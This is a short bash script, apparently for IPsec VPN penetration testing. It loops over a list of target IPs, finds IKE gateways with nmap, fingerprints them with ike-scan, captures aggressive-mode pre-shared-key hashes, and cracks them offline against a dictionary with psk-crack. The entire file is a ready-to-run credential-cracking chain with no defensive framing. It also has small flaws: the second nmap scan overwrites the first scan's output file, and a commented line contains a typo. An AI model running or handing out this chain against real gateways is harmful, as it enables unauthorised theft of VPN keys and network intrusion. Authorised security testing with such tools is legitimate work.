#!/bin/bash
#
#http://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/
#http://blog.stoked-security.com/2010/12/how-hard-could-it-be-to-brute-force.html
#
#
for IPs in $(cat targets);do
#Scanning or identifying the VPN gateway
nmap -sU -p 500 $IPs -o Results.txt
nmap -Pn -p 500 $IPs -o Results.txt
#Initial IPsec VPN discovery with Ike-scan
ike-scan -M -A $IPs
#Fingerprinting the VPN gateway for guessing implementation
ike-scan -M --showbackoff $IPs
# specify a random group id
#ike-scan -M --id=foobar -A $IPs
#ike-scan -M --id=secret -A $Ps
#PSK mode assessment and PSK sniffing
ike-scan --pskcrack --aggressive --id=peer $IPs >> psk.txt
#Offline PSK cracking
psk-crack -d /usr/local/share/ike-scan/psk-crack-dictionary psk.txt
done
